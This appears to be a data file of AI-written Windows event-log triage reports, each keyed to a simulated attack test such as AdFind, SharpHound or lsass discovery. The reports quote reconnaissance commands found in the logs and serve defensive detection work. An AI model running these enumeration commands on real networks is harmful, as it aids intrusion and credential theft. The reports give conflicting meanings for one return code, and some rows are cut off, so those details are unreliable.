  - **Windows Update Client events** indicate a Defender Antivirus update was applied, which is typical and expected behavior.
  - **Kernel-General and Time-Service** events reflect time adjustments, which could be normal due to system re-synchronization with an NTP server. The ongoing use of `svchost.exe` in these processes is standard.

### Application Log
- Activities primarily include status updates from Windows Defender and standard application lifecycle events, such as the stopping of the `edgeupdate` service, which seems routine.

### Windows PowerShell Log
- Notable activities involve the execution of PowerShell commands:
  - Commands such as `Get-NetFirewallProfile`, `Get-NetFirewallSetting`, and firewall rules checks are related to querying firewall configurations. This could be routine administrative activity but requires attention if it's done frequently or without a clear, documented purpose.

### Security Log
- The log shows normal security auditing events typically related to time adjustments, with the consistent use of `svchost.exe`.

### Sysmon Log
- Observations include standard command-line executions and some benign utilities (`whoami.exe`, `hostname.exe`) which print system-related information. These processes originate from an administrative user account, suggesting a review of user activity may be warranted, especially if actions are undocumented.
- There's a sequence of `wevtutil.exe` and `conhost.exe` sessions indicating either log-related tasks or routine administrative command prompt usage. This activity does not necessarily indicate malicious behavior alone but should be contextually analyzed against known baselines.

### Assessment & Resolution
**SUSPICIOUS** - There are elements highlighted that could signal either benign or administrative processes or potential misuse, particularly concerning the frequent use of PowerShell commands querying firewall states and the number of console-hosted processes (`conhost.exe`). However, there is no clear evidence from these logs alone to definitively categorize the activity as malicious. It is advisable to:

1. Verify the user activity of `admin_test` for legitimacy.
2. Cross-reference with any network logs or additional endpoint data for further corroboration.
3. Potentially enhance monitoring around administrative accounts and sensitive configuration changes (e.g., firewall settings).
4. Consider verifying the intent and need behind running such PowerShell scripts, especially for non-routine tasks.

### Next Steps
- Engage with the IT or security operations team to confirm if these activities align with recent administrative tasks.
- Conduct authentication log reviews and cross-referencing for unusual session activities.
- Increase alert sensitivity or rules around frequent PowerShell and firewall setting alterations without documented admin approval."
Adfind - Enumerate Active Directory OUs,"After analyzing the provided event logs from the CEO's machine, here's the assessment:

### Suspicious or Anomalous Behavior:

1. **PowerShell Execution (Sysmon Event ID 5)**:
   - There are multiple instances of PowerShell execution (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) logged under user `SERVER002\\admin_test`.
   - While PowerShell usage is common, it's often exploited by attackers for scripting malicious tasks due to its powerful capabilities.

2. **AdFind Usage via Command Prompt (Sysmon Event ID 1)**:
   - A command line execution of `cmd.exe` with `AdFind.exe` observed: `""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe"" -f (objectcategory=organizationalUnit)`.
   - AdFind is a legitimate tool used for directory reconnaissance, but it is frequently used by attackers to gather Active Directory data in post-exploitation scenarios.

3. **Frequent `wevtutil.exe` and `conhost.exe` Executions (Sysmon Event ID 5)**:
   - There are numerous repetitive executions of `wevtutil.exe` and `conhost.exe` processes associated with the same user `SERVER002\\admin_test`.
   - Excessive or abnormal usage of `wevtutil.exe` might indicate log tampering, as this utility can be used to clear logs.

4. **Multiple Edge Update Executions (Sysmon Event IDs 1 and 5)**:
   - Numerous instances of `MicrosoftEdgeUpdate.exe` running with different command-line arguments, under the `NT AUTHORITY\\SYSTEM` account.
   - While regular updates can generate these logs, the frequency and context could suggest misuse, especially if attackers intended to use update mechanisms to execute code.

5. **Use of `whoami.exe` and `hostname.exe` (Sysmon Event ID 1)**:
   - These commands are used to gather system and user information.
   - Run under `SERVER002\\admin_test`, suggesting an inquiry into user privileges and machine details, a common reconnaissance step.

### Indicators of Compromise or Malicious Activity:

- The above behaviors, especially the use of `AdFind` and numerous administrative level PowerShell scripts, point to potential malicious intent or at least an investigation-worthy anomaly.
- Possible log tampering signs through `wevtutil.exe` usage.
- Frequent service and update operations could denote persistence mechanisms or attempts to cover tracks with legitimate services.

### Guidance and Resolution:

**Resolution: SUSPICIOUS**  
The activity described in the logs should be classified as suspicious. While activities like PowerShell and `wevtutil.exe` may be present in benign scenarios, their usage, combined with execution of tools like AdFind without a clear business need, suggests potential misuse. Further investigation is warranted to confirm if these actions were authorized or if an underlying malicious campaign is underway.

**Next Steps:**
1. **Investigate the Account `admin_test`:** Verify if the actions executed under this account were legitimate and authorized by the user.
2. **Check File Integrity and Sources:** Analyze the source and integrity of `AdFind.exe` and other executables used within the timeframe.
3. **Hunt for IOCs**: Deploy additional checks for known indicators of compromise (IOCs) related to the observed behavior.
4. **Network and Endpoint Monitoring**: Increase monitoring of the network for abnormal interactions on the machine and others in the same group or domain.
5. **Incident Response Actions:**
   - If unauthorized activity is confirmed, consider isolating the machine and conducting a full forensic analysis to understand the scope.
   - Review audit logs regarding changes or activities in the system related to the suspicious activities.
"
Extract Edge Browsing History,"After analyzing the provided logs from various sources, here is a breakdown of the situation:

### Observations
1. **Series of svchost.exe Time Change Events:**
   - The security logs indicate multiple Event ID 4616 entries where the system time was changed using the `svchost.exe` process. While changing system time could be benign, an excessive number of changes might be suspicious, particularly if there is no apparent reason for those changes.

2. **PowerShell Activity:**
   - There are entries in both the Sysmon and Windows PowerShell logs indicating the use of PowerShell scripts to interact with browser history files related to Microsoft Edge. The script extracts URLs from the browser history which is then sorted and saved to a file. This sort of activity could be indicative of data collection or surveillance.

3. **Wevtutil.exe Usage:**
   - The Sysmon logs show the execution of `wevtutil.exe`, a legitimate Microsoft utility, typically used for exporting, archiving, and clearing event logs. This can be part of normal system administration but could be indicative of log clearing to hide malicious activity if followed by suspicious events.

4. **Elevation of Privileges:**
   - Sysmon logs display several processes, including `taskhostw.exe` and `MicrosoftEdgeUpdate.exe`, running with system-level privileges (`NT AUTHORITY\SYSTEM`). Log analysis doesn't immediately indicate any abuse, but maintaining high privileges could potentially be exploited.

5. **Command Execution Entries:**
   - Multiple executions of `whoami.exe`, `conhost.exe`, and other basic commands are noted. The frequent use of `whoami.exe` can be indicative of an attacker attempting to determine their level of access.

### Assessment
- **The PowerShell script accessing and saving Edge browsing history appears quite anomalous**, particularly if there is no legitimate reason for someone in the company to be gathering browser history data from the CEO's machine.
- **The use of `wevtutil.exe` in close proximity to notable event entries such as time changes and PowerShell execution is suspicious**.
- **Continuous svchost-driven time changes could be potentially indicative of attempts to obscure timeline activities** related to other suspicious or malicious activities.

### Resolution
Given the observations of potentially obfuscative activities via time changes, direct browser data access, and the use of log management utilities in the context provided:

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed
1. **Isolate the Machine:**
   - As a precautionary measure, isolate the CEO's machine from the network to prevent further potential data exfiltration or lateral movement within the network.

2. **In-depth Analysis:**
   - Conduct a forensic analysis of the machine, focusing on:
     - PowerShell execution history.

Process Discovery - Get-Process,"## Analysis of Logs

### System Log
1. **Time Synchronization Events**: 
   - Events indicate time changes by `svchost.exe`, which is a legitimate process responsible for hosting services. 
   - Potential concern comes from frequent time changes, a tactic that might be used to evade detection in forensic analysis.

### Sysmon Log
1. **Process Execution by `admin_test`**:
   - Multiple executions of `wevtutil.exe` and `conhost.exe` are observed. `wevtutil.exe` is used for managing Windows Event logs and could be legitimate or part of malicious activity when abused.
   - The presence of `HOSTNAME.EXE`, `whoami.exe`, and PowerShell execution show system reconnaissance activity (`whoami`, `hostname`, and PowerShell get process command).
   - The command `powershell.exe & {Get-Process}` seems benign but could be part of a script or combined with malicious activities.

### Security Log
1. **User Activity**:
   - The logs show the use of `SeDebugPrivilege`, which is significant as it can modify or inspect system processes. It could be normal for an admin but needs validation of `admin_test` activities.
   - Logon activity shows impersonation potential (e.g., NTLM logon, elevated tokens).

### PowerShell Log
- The activity suggests possible use of PowerShell for scripting or admin tasks. Monitoring of PowerShell is recommended due to its potential for abuse.

### Other Potential Concerns
- **Widespread use of the same commands**: `whoami.exe`, `powershell.exe`, and network service activity could be part of automated scripts or unauthorized access attempts.
- The quick sequence and combination of these process executions could indicate script-based actions, potentially from admin scripts or malicious operations.

## Assessment
- **Indicators of Scripted Activity**: The activities resemble normal system administration tasks but executed in rapid succession.
- **Misuse of Admin Privileges**: Use of `SeDebugPrivilege` and other high privileges without clear context of why such operations are performed.

## Resolution
The overall combination of reconnaissance commands, potential misuse of admin privileges for process and event log operations, and time adjustments suggest potential misuse or preparation for malicious activities.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed
1. **Validate Admin Activities**: Verify with the user `admin_test` or relevant administrator if these activities were routine tasks.
2. **Review Policies**: Ensure the policies are in place for monitoring elevated privileges usage.
3. **Further Investigation**: Look into any other alerts or logs from other sources for correlation.
4. **Monitoring and Logging**: Enhance real-time monitoring of similar behaviors and adjust detection rules if necessary."
Active Directory Enumeration with LDIFDE,"Based on the provided Windows event logs, here is a detailed analysis focusing on potential indicators of malicious activity:

### Analysis:

1. **Repeated Logon by SYSTEM Account**:
   - Event ID 4624 indicates a series of successful logons using the SYSTEM account. While it's not unusual for the SYSTEM account to log on for internal processes, the frequency and rapid succession of these events could be worth closer examination if they are not normally expected behavior for this system.

2. **Privileged Actions and SeDebugPrivilege**:
   - Event ID 4672 logs special privileges assigned during SYSTEM logons, including SeDebugPrivilege. The presence of this privilege can be used by malicious actors to debug and manipulate other processes, which could be a sign of concern.

3. **Failed Credential Access Attempts**:
   - Event ID 5379 repeatedly notes unsuccessful attempts to access credentials related to a Microsoft Account (user=02txoixylodcstop), which returned error code 3221226021 (STATUS_NO_SUCH_USER). This could indicate a misconfiguration or unauthorized attempts to access credentials.

4. **Sysmon Process Activity**:
   - Sysmon logs (Event ID 1 and 5) demonstrate the execution of several Windows utilities like `powershell.exe`, `cmd.exe`, `Conhost.exe`, `wevtutil.exe`, `whoami.exe`, `sc.exe`, and executions related to Microsoft Edge updates. Particularly, we observe:
       - Usage of `powershell.exe` which, if unscheduled or unexpected and combined with admin_test privilege, can be concerning.
       - `cmd.exe` executing `ldifde.exe` to export data. While not inherently malicious, it may warrant further inspection depending on the context and necessity.
       - Multiple uses of `wevtutil.exe`, which could imply log manipulation.

5. **Process Creation in Rapid Succession**:
   - The rapid creation of processes like `conhost.exe` and `whoami.exe` in a short time frame might suggest automated scripts or commands executed.

6. **Microsoft Edge Update Activity**:
   - The logs also indicate activity concerning Microsoft Edge updates. While generally benign, the context of this activity should be verified to ensure it is legitimate.

### Assessment:

While many logs describe routine SYSTEM account activities or software updates, keys indicating potential suspicion include:

- **The rapid succession of logon events by SYSTEM**.
- **Repeated failures to access non-existent credentials**.
- **Execution of potentially sensitive commands like PowerShell, likely by a non-administrative user**.
- **Command usage and unexpected behavior by the `admin_test` account**.

### Guidance:

1. **Further Investigation**: Although no definitive malicious activity is confirmed, the presence of suspicious patterns warrants a closer examination.
   - Verify if the SYSTEM activities are aligned with typical system operations during the observed timeframe.
   - Look for correlated logs on network activity or external connections that align with these events.
   - Check the legitimacy of `admin_test` account and its activities to ensure it's not compromised.
   - Confirm the context around the use of `PowerShell`, `cmd.exe`, and logging utilities which could potentially indicate malicious script execution.

2. **Close Monitoring**: Continue to monitor this host for any recurrence of similar patterns or deviations from regular behavior.

3. **User Account Review**: Conduct a security review on user accounts, focusing on any abnormal access patterns, especially for higher privilege accounts like admin_test.

### Resolution: **SUSPICIOUS**

The logs contain activities that suggest irregular, if not outright harmful, behavior, which mandates a deeper analysis to rule out potential threats or misconfigurations."
Adfind - Enumerate Active Directory Domain Controller Objects,"### Detailed Analysis of the Windows Event Logs

**1. Observed Activities in the Logs:**

- **Application Log:**
  - Both entries indicate Windows Defender's security state is ON. There are no alarming behaviors noted here.

- **System Log:**
  - The logs display normal updating activities by the Windows Update Client. The update actions pertain to Microsoft Defender Antivirus, indicating a regular security update process.

- **Sysmon Log:**
  - **PowerShell Activity:**
    - A PowerShell process was executed by `SERVER002\admin_test`. PowerShell can be used maliciously, so this needs to be closely examined.
  - **Execution of `wevtutil.exe` and `conhost.exe`:**
    - `wevtutil.exe` and `conhost.exe` processes executed multiple times by `SERVER002\admin_test`. While commonly used for legitimate administrative tasks, frequent usage, especially when correlated with admin accounts, can suggest log manipulation or command-line activity masking.
  - **Execution of Edge Updates:**
    - Several processes related to Microsoft Edge update and installation such as setup.exe were executed by `NT AUTHORITY\SYSTEM`, which seem consistent with legitimate software updates.
  - **Execution of tools like `whoami.exe`, `hostname.exe`, and `cmd.exe`:**
    - These are legitimate Windows binaries. However, `cmd.exe` running with a potentially suspicious command including `AdFind.exe`—a utility used to query Active Directory—might indicate enumeration activity related to potential further attacks.
 
- **Security Log:**
  - Multiple entries of Event ID 5379 associated with auditing credentials were observed. The credentials could not be found (return code: 3221226021 is `STATUS_NO_SUCH_LOGON_SESSION`), which typically yields no immediate concern but can sometimes be correlated with attempts to enumerate or authenticate against Microsoft accounts.

**2. Assessment of Potential Malicious Activity:**

- **Suspicious Process Execution:**
  - The presence of processes like `cmd.exe` executing with AdFind could suggest possible reconnaissance or enumeration of the environment, typically seen in lateral movement stages of an attack.

- **Misuse of Administrative Accounts:**
  - The continuous execution of processes via `SERVER002\admin_test`, particularly against system binaries calls for further investigation. This could suggest privilege misuse or potential compromise.

- **Absence of Additional Context in PowerShell Logs:**
  - While a PowerShell execution was noted, without additional logged command detail, assessing the intent remains incomplete. PowerShell is a notable attack vector, especially when executed by privileged accounts.

**3. Conclusion and Resolution:**

- Given the evidence of potential enumeration with `AdFind.exe` and repeated unsanctioned-looking process executions by an administrator account, further investigation is required to determine intent and scope.

- **Resolution: SUSPICIOUS**

### Guidance on How to Proceed:

1. **Investigate User `SERVER002\admin_test`:** Determine whether these actions were sanctioned and analyze any recent login activity or changes associated with this account.

2. **Scrutinize PowerShell Execution:** Look for any stored PowerShell logs or command history that might provide more clarity on its usage.

3. **Analyze Network Traffic:** If AdFind.exe was executed, network analysis may reveal additional enumeration activity against domain controllers.

4. **Check for Corresponding Alerts:** Review EDR alerts that triggered this log examination. 

5. **Consider Containment Actions:** Depending on further investigation findings, prepare for containment or remediation actions, including isolating the affected system or reviewing access permissions.

Continued vigilance and immediate follow-up actions should be prioritized to prevent potential malicious activities from escalating."
Enumerate Default Domain Admin Details (Domain),"Upon reviewing the provided event logs, several observations can be made regarding potential indicators of malicious activity:

### Observations:

1. **Privilege Assignment:**
   - An event with Event ID 4672 indicates that user `admin_test` was assigned special privileges, such as `SeDebugPrivilege`, among others. This privilege allows for extensive control and is generally restricted to administrators. When seen granted suddenly or unexpectedly, it might be indicative of privilege escalation or an unauthorized account setup.

2. **Unusual Process Activity:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` are executed by the `admin_test` user. The repeated execution of `wevtutil.exe`, a utility for managing Windows Event Logs, can sometimes indicate attempts to interact or clear event logs to hide tracks.
   - The process `whoami.exe` was executed, which is typically used to check the current user context, often seen in scripting or investigating processes. 
   - `cmd.exe` was executed using the command `net user administrator /domain`. This command is commonly used in administrative tasks for querying user account information but can be suspicious if executed unexpectedly, as it may indicate recon attempts or password checking.

3. **System Process Execution:**
   - There are multiple benign Microsoft Edge update-related activities observed which involve the `MicrosoftEdgeUpdate.exe` process. This likely represents routine background updates for Microsoft Edge, judging from the systematic parent-child processes and description.

### Potential Malicious Activity:

- The combination of assigning high-level privileges with Event ID 4672 and utilizing `wevtutil.exe` suggests possible logging tampering intentions by the user `admin_test`.
- Given the logged activities of `cmd.exe` with a specific command targeting `administrator` accounts, there are grounds for suspecting unauthorized reconnaissance or privilege-detailed queries.

### Assessment:

The findings from these logs present suspicious activities, highlighted by unauthorized privilege granting and executable usage indicative of potential attempts to hide actions or elevate privileges. While no overtly malicious software execution was observed, the behavior of the actions requires further scrutiny and correlation with other events or host behavior.

### Resolution:

**SUSPICIOUS:** The activities observed necessitate deeper investigation. Specifically, access and actions by user `admin_test` should be examined in greater detail. Comprehensive log reviews, endpoint integrity checks, and correlation with threat intelligence would provide clarity on whether the activities were permissible administrative actions or indicative of a potential compromise.

### Recommended Next Steps:

1. **Conduct a Full Audit:**
   - Review permissions and group memberships for `admin_test`.
   - Check recent changes made on the system and compare against change management records.

2. **Network and Endpoint Investigations:**
   - Monitor network activity on hosts where `admin_test` logged activity.
   - Deploy additional endpoint detection mechanisms to spot any unauthorized privilege escalation or use.

3. **User and Activity Validation:**
   - Verify with the user or administrative staff on intended actions during the timeframe of suspicious activity.
   - Cross-verify with user activity logs to look for concurrent suspicious patterns.

Emphasizing the importance of context in user actions, further investigation will confirm whether these activities align with normal operational tasks or indicate potentially illicit behavior."
System Network Configuration Discovery (TrickBot Style),"### Analysis of Windows Event Logs

#### Summary:
The logs from the CEO's machine primarily reveal a series of events that could be indicative of typical system operations, software updates, and some potentially anomalous activities that require further investigation.

#### Analysis of Key Events:

1. **Repeated Event ID 5379 Logs:**
   - This event indicates Credential Manager operations. The frequent occurrence of failed credential read operations (ReturnCode: `3221226021`, which corresponds to STATUS_LOGON_FAILURE) is unusual. This could indicate attempts to access credentials that are not authorized, possibly mimicking a brute force or credential harvesting behavior.
   - The involved Subject is `SERVER002$`, which corresponds to the machine account, indicating that these actions are automated or system-level processes.

2. **Event ID 4624 and 4672 Logs:**
   - Successful logon with Event ID 4624 of Logon Type 5 indicates service logon, which is typical for system processes. It corresponds to the SYSTEM user, which is legitimate for services running on this machine.
   - Event ID 4672 indicates privileges are being assigned to `admin_test` that include potentially dangerous privileges (`SeDebugPrivilege`, `SeTakeOwnershipPrivilege`). These should be monitored whether this account is intended to have administrative access.

3. **Commands Executed:**
   - The Sysmon logs capture command-line executions, including `cmd.exe` run with network-related commands (`ipconfig`, `net config`, `net view`, `nltest`). These could be part of routine administration, but given the context, they could also be reconnaissance commands associated with lateral movement or domain discovery.

4. **Software Installations and Updates:**
   - Various processes indicate the legitimate updating of Microsoft Edge (e.g., `setup.exe` for Microsoft Edge). The frequent execution of Edge update processes seems routine and aligned with recent updates from Windows Update logs.

5. **Anomalous Behavior:**
   - The repeated `wevtutil.exe` and `conhost.exe` processes by user `admin_test` suggest that administrative functions related to event logs were carried out. These actions coincide with the time of observed unlocked privileged accesses.
   - Without clear documentation, this may indicate tampering with event logs or monitoring activities.

#### Threat Assessment:
- The combination of failed credential accesses, unusual reconnaissance commands, and admin-level operations suggest a pattern that could warrant further investigation. There’s no outright indication of success, but potential compromise preparation is evident.

#### Conclusion:
- **Resolution: SUSPICIOUS**

### Recommendations:
1. **Immediate Monitoring and Investigation:**
   - Investigate the `admin_test` account activities to ensure they align with expected administrative tasks. Check for evidence of potential account compromise.
   - Review the context and source of the credential access failures for potential brute-force or unauthorized access attempts.

2. **Audit Privileges and Access:**
   - Conduct an audit to confirm whether the SYSTEM and admin_test account should have these privileges and access scopes.

3. **Enhance Monitoring:**
   - Increase logging and alerting on the CEO’s machine and related environment, particularly for elevated credential failures and administrative activities.

4. **Incident Response Preparation:**
   - Prepare incident response documentation and be ready for further escalation if additional signs of compromise appear.

Further investigation should correlate this activity with network traffic or other logs to discern whether malicious activities are ongoing or have been blocked."
Launch DirLister Executable,"Upon reviewing the provided event logs, I have identified several points of interest that could potentially indicate suspicious or malicious behavior:

1. **PowerShell Activity**:
   - The logs display multiple instances of PowerShell executing with the command:
     ```powershell
     Start-Process ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\DirLister.exe""
     Start-Sleep -Second 4
     Stop-Process -Name ""DirLister""
     ```
   - This activity is suspicious because executing applications from a temporary directory (especially with obfuscated paths like `..`) is unconventional. It's often used for executing malicious payloads without saving them on the cleaner parts of the system.
   - The `DirLister.exe` application is being executed and then stopped shortly after, suggesting it might be carrying out a quick operation potentially aimed at data enumeration or exfiltration.

2. **Sysmon Logs**:
   - There is consistent evidence of `powershell.exe` initiating an application located in a temp directory (DirLister.exe), which aligns with common tactics used in fileless malware and living-off-the-land attacks.
   - The series of events related to the execution of `DirLister.exe` and subsequent process creations through Sysmon suggest a concerted effort to obscure the activities and appear typical while potentially conducting malicious actions.

3. **Potential False Positives**:
   - Some logs are associated with `MicrosoftEdgeUpdate.exe`, which is a legitimate process used for updating Microsoft Edge. Although seeing frequent launches might catch attention, the process and command arguments used appear consistent with normal update activities.

4. **Event Timing and User Context**:
   - All suspicious activities have been executed under the user context `SERVER002\admin_test`, which is noteworthy as elevated or administrative accounts performing such activities without clear purpose can indicate compromise.

### Assessment:

- The combination of executing processes from a temporary directory using PowerShell, alongside unusual command-line invocations, suggests potentially suspicious intent.
- The usage of PowerShell to launch executables from a less secured location (temp directory) and remove or stop them after a short duration might indicate attempts to carry out transient operations without leaving a trace.

### Conclusion:

Based on the analysis above, I classify the situation as **SUSPICIOUS**. The activities could be indicative of a testing script or an internal IT task; however, the use of the temp directory and the sequential stopping of processes following their execution is out of the ordinary and does warrant further investigation.

### Recommendations:

1. **Immediate Response**:
   - Conduct a thorough forensic investigation on the `Server002` machine to understand the nature of `DirLister.exe` and verify its legitimacy.
   - Review the administrative account `admin_test` activities and validate whether the interactions align with known and authorized behavior.
   - Check for any anomalies or unexpected changes in files/directories accessed by `DirLister.exe`.

2. **Long-term Measures**:
   - Implement stricter application whitelisting to prevent the execution of unauthorized applications from temporary directories.
   - Enhance PowerShell auditing to log all commands and ensure potential signs of misuse are promptly reported.
   - Review and tighten access controls for administrative accounts, reducing opportunities for misuse."
Azure Security Scan with SkyArk,"### Detailed Analysis

Upon examining the provided set of Windows event logs, several critical observations can be made:

1. **Unusual PowerShell Activity:**
   - The PowerShell events (EventID 600) indicate the execution of a script named `AzureStealth.ps1` from a temporary location on the filesystem (`C:\Users\ADMIN_~1\AppData\Local\Temp`). This alone is suspicious as temporary folders are often used for malicious scripts.
   - The script in question contains commands to convert a plaintext password, create a PSCredential object, and connect to Azure accounts, which are operations typically associated with administrative tasks. However, this might also be indicative of malicious activity if not sanctioned.
   - The use of PowerShell to manage Azure accounts (e.g., `Connect-AzAccount`, `Connect-AzureAD`) can be legitimate but warrants scrutiny given its stealth sourcing from a temp file and the labelling of the script as ""AzureStealth"".

2. **Sysmon Logs - Process Creation and Monitoring:**
   - Entries show the instantiation of `powershell.exe` with the same suspicious script mentioned above.
   - The creation of consolerelated executables such as `conhost.exe` indices common legitimate activities, however, their parent-child relationship with `powershell.exe` engaged with the suspicious script, and actions like using `wevtutil.exe` could point to attempts in event log manipulation or clearance.

3. **Security (Audit) Logs:**
   - A notable login event (EventID 4624) using NTLM from a machine `DESKTOP-3HL5B2P`, marked by a user `admin_test`. This could suggest lateral movement if `DESKTOP-3HL5B2P` is not a known entity within internal infrastructure or part of expected administrative operations.
   - Enhanced privileges like `SeDebugPrivilege` used by the `admin_test` account, registered in EventID 4672, can indicate malicious intent as these are powerful permissions often leveraged by attackers for system exploitation.

4. **Other Observations:**
   - Numerous Sysmon entries (EventID 5) present standard system processes operative as `NT AUTHORITY\SYSTEM`. This could be normal service operations but needs contextual validation to rule out process injections or unauthorized service activities.
   - Elevated console actions (e.g., `HOSTNAME.EXE`, `whoami.exe`) could be validation steps by a potential attacker checking system info due to their link back to `powershell.exe`.

### Assessment

Based on the detailed review, the logs demonstrate several indicators of potential compromise:

- Execution of potentially malicious PowerShell script from an uncommon directory (`AppData\Local\Temp`), conducting admin-tasks covertly.
- Evidence of enhanced privileges used for probable unauthorized actions.
- External NT authentication with risk of lateral movement.

### Resolution

Given these insights and coupled with the entire context, the incident can be categorized as:

- **SUSPICIOUS**

### Guidance for Next Steps:

1. **Immediate Actions:**
   - Isolate the affected system (Server002) to prevent potential further exploitation.
   - Enhance monitoring on all network-authenticated devices for similar suspicious activities, particularly around PowerShell execution.

2. **Further Investigation:**
   - Verify the legitimacy of the involved PowerShell script (`AzureStealth.ps1`) and its origin.
   - Correlate all administrative logons and actions conducted by `admin_test` with authorized administrative tasks.
   - Cross-reference external IPs, hostnames, and origination devices against known infrastructure and personnel.

3. **Long-term Actions:**
   - Consider implementing a more robust audit trail for PowerShell and its scriptblock logging to mitigate hidden execution risks.
   - Elevate user awareness regarding privileged account vigilance and password policies.
   - If determined as unauthorized activity, employ disciplinary or legal action based on internal protocols."
System Discovery - SocGholish whoami,"### Detailed Analysis of the Logs

#### Security Logs Analysis
1. **EventID 5379**: This event indicates credential access operations, specifically failed attempts to retrieve a Microsoft account-related credential using the `MicrosoftAccount:user=02txoixylodcstop`. The ReturnCode `3221226021` translates to `STATUS_NO_SUCH_LOGON_SESSION`, which often means there was an attempt to access a session that doesn't exist. Frequent, unsuccessful credential access attempts are often associated with reconnaissance or lateral movement efforts by attackers.

#### Sysmon Logs Analysis
2. **Process Creation Events (EventID 1)**: The series of events capture several instances of commonly used Windows utilities such as `whoami.exe`, `conhost.exe`, and `PowerShell.exe` executed by the user `SERVER002\admin_test`. 
   - The PowerShell process with a command involving `$TokenSet` suggests some form of script execution which generates a temporary file using random characters and performs user information enumeration through `whoami.exe`. Such scripts may indicate obfuscated or scripted administrative activity, potentially aiming for unauthorized data collection or exfiltration.
   
3. **Wevtutil.exe Usage**: This utility is logged under Sysmon EventID 1 for command execution. `Wevtutil` is a legitimate Windows command-line utility for managing Windows Event Logs, but if used maliciously, can be employed to clear or export event logs to cover tracks.

4. **Taskhostw.exe and WU Client Activity**: These represent legitimate activities regarding system update-related tasks (`wuauclt.exe` for Windows Update Client and `MuUsoCoreWorker`).

#### Windows PowerShell Logs Analysis
5. **PowerShell Activities**: The specific command involves generating random token strings and executing `whoami.exe` when creating a temporary file in the system's environment directory. This is typical of attempts to execute obfuscated or minimally detectable scripts in a suspect way and is often seen in malicious PowerShell activities.

#### System Logs Analysis
6. **Windows Update Activity**: Legitimate activity as seen by the update for Microsoft Defender Antivirus. There are no signs of tampering or malicious alteration in these updates.

### Assessment, Threats, and Risks
- **Assessment**: The pattern of executing `whoami.exe` with potentially obfuscated PowerShell script snippets, combined with the use of `wevtutil.exe`, points toward potentially suspicious behavior.
- **Threats/Risks Identified**: There is a risk that the user `SERVER002\admin_test` is running potentially nefarious PowerShell scripts, indicative of malicious internal activities or lateral movement strategies commonly employed by attackers.

### Guidance
- Investigate the source and intent of the PowerShell script run by `admin_test`.
- Check for any unauthorized changes or unusual activity linked to user `SERVER002\admin_test`.
- Review user access permissions and consider implementing tighter access controls and additional logging, such as PowerShell logging or AMSI (Antimalware Scan Interface) integration.
- Consider isolating `Server002` if further malicious indicators are found upon additional investigation.

### Final Resolution
**SUSPICIOUS** - The logs contain behavior that is anomalous and indicative of potentially malicious actions, warranting further investigative action."

### Observations:
1. **Frequent Usage of `wevtutil.exe` and `conhost.exe`:**
   - The repeated and rapid execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test` might indicate an attempt to manipulate or read event logs. Such activities are often associated with clearing tracks (log tampering) or diagnosing potential security incidents, which might be benign or malicious depending on the context.

2. **Execution of Known Diagnostic and Enumeration Tools:**
   - There are instances of `hostname.exe` and `whoami.exe` being executed. While these tools are commonly used for diagnostic purposes, their repetitive use in conjunction with other suspicious activities might indicate reconnaissance activities by an unauthorized user or insider.

3. **Command Line Usage:**
   - The execution of `cmd.exe` with the command `tasklist | findstr lsass` suggests a specific focus on the `lsass` process, which is often targeted in credential dumping attacks. This could indicate an attempt to identify or interact with processes containing sensitive information.

4. **Adjustments in System Time:**
   - The system and security logs show changes to the system time initiated by `svchost.exe`, a legitimate system process. However, unauthorized time changes can be suspicious if they are not part of normal system operations, potentially indicating efforts to bypass time-based security measures or log timelines.

### Assessment:
- The activity involving `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and the specific command targeting `lsass` suggests actions that are not typical of regular user behavior, especially for the CEO’s machine. The focus on `lsass`, in particular, is concerning and aligns with tactics used in cyber intrusion scenarios to extract sensitive credentials.
- The altering of system time, when observed alongside other suspicious behavior, could point to attempts of obfuscating tracks or altering log timelines to confuse forensic investigations.

### Conclusion and Resolution:
Given this evidence, the activities observed in the logs exhibit characteristics of potentially unauthorized reconnaissance and log tampering actions, potentially indicating an intrusion or malicious intent.

**Resolution: SUSPICIOUS - If logs contain activity that doesn't look right and needs more investigation**

   - Increase monitoring for similar activities and leverage anomaly detection to flag unusual process executions and system changes.

These steps are essential to confirm whether these activities signal a compromise and to ensure the system's security is maintained."
SharpHound3 - LocalAdmin,"Based on the provided event logs, here's a detailed analysis of the events and their context:

### Analysis:

1. **Security Log:**
   - Event ID 4624 indicates a successful logon with Logon Type 5, which corresponds to a service logon. This event in itself is normal as services on a server typically use this type of logon.
   - Event ID 4672 shows a privileged operation where the SYSTEM account was assigned multiple high-level privileges. This, too, is generally typical if services are being managed or updated, and does not directly indicate malicious activity.

2. **Sysmon Log:**
   - The execution of `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` by the user `SERVER002\admin_test` is concerning due to the nature of the PowerShell command. It attempts to create a directory and execute `SharpHound.exe`, which is a known tool used for Active Directory reconnaissance, often used by attackers during lateral movement or information gathering.
   - Multiple invocations of `wevtutil.exe` and `conhost.exe` by the same user might indicate log manipulation attempts, as `wevtutil.exe` is commonly used to clear or tamper with event logs.
   - The sharp increase in process creation events around the same time as the PowerShell execution should be noted. These include `HOSTNAME.EXE`, `whoami.exe`, `SharpHound.exe`, and their associated console windows (`conhost.exe`). This pattern suggests a sequence of reconnaissance or enumeration activities.

3. **Windows PowerShell Log:**
   - Events indicate PowerShell execution with scripts that reference `SharpHound.exe`. The tool is typically used to gather information from Active Directory environments. The context hints at potential unauthorized reconnaissance actions.

4. **Application Log:**
   - Two Windows Defender entries show it as active, indicating security protection was functioning.

### Assessment:

The outlined activities, especially the execution of `SharpHound.exe` via PowerShell, suggest an attempt to gather sensitive information about the network. This behavior is particularly suspicious in a corporate environment and suggests a potential security breach. The use of `wevtutil.exe` may further indicate attempts to hide evidence of suspicious activities.

### Resolution:

Given the presence of tools like SharpHound and the context in which they were executed, alongside potential log tampering, I would categorize these findings as **MALICIOUS**.

### Recommendations:

1. Immediately isolate the affected machine (Server002) from the network to stop potential spread or further information gathering.
2. Conduct a full forensic analysis on the affected machine to confirm the extent of the breach.
3. Change all administrative credentials, especially those linked to `SERVER002\admin_test`.
